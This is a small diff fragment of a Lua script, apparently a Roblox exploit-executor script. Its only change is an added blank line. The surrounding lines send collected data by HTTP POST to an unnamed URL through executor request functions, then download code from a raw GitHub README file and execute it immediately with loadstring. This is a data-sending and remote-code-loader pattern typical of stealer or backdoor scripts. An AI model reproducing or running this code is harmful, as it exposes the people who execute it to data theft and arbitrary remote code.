@@ -55,3 +55,4 @@ request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/DevilXD99/mapping/main/README.md"))()
+ 
